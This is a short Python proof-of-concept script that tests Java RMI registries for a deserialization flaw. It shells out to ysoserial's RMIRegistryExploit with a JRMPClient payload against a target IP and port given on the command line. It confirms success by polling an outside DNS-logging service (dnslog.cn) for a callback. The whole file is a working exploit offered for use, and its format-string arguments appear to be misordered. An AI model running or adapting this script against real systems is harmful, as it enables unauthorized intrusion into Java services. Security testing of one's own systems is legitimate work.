import sys
import os
import random
import requests

rand = random.random()
yso = 'ysoserial.jar'
payload = 'CommonsCollections6'
payload2 = 'JRMPClient'


s = requests.session()

def dnslog():
    r = s.get('http://www.dnslog.cn/getdomain.php')
    domain = r.text
    return str(rand) + '.' + domain

def getrecords():
    r = s.get('http://www.dnslog.cn/getrecords.php')
    con = r.text
    return con

def poc_rmi(ip, port):
    domain = dnslog()
    print('[*] Get dnslog domain -> {0}'.format(domain))
    print('[*] Get random -> {0}'.format(rand))
    
    cmd = "java -cp {0} ysoserial.exploit.RMIRegistryExploit {1} {2} {4} '{3}' >/dev/null 2>&1".format(yso, ip, port, domain, payload2)
    print('[*] Send Payload -> ' + cmd)

    try:
        os.system(cmd)
    except:
        pass

    if str(rand) in getrecords():
        print('\n[+] Find Vul')
        print(getrecords())



if __name__ == '__main__':
    if len(sys.argv) < 2:
        sys.exit('[x] python3 {} 10.10.10.116 1099'.format(sys.argv[0]))

    poc_rmi(sys.argv[1], sys.argv[2])

